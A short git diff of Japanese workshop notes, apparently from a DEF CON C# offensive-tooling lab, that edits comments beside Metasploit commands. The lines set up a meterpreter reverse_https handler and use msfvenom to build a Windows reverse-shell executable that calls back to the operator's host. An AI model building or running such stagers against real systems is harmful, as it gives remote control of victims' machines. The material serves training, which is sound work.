@@ -33,10 +33,10 @@ set payload windows/x64/meterpreter/reverse_https
 set LHOST [YOUR_IP]
 set LPORT 8080
 
-#Create stager by msfvenom
+#Create stager by msfvenom  これはmulti handlerのurlを確認するだけの為のもの
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=Your_Kali_IP LPORT=8080
 -f exe > ~/reverse.exe
-#twistd3とかでこのmalwareが送信するランダムなURLを確認する
+#twistd3とかでmaltihandlerと同じアドレスとポートを設定しこのmalwareが送信するランダムなURLを確認する
 ```
 確認したランダムなURLで[2.cs](https://github.com/DharmaDoll/defcon27_csharp_workshop/blob/56a29e8fc1288a70bd0fbdd558014f9bf7396252/Labs/lab2/2.cs#L30) の箇所をUpdateする
 
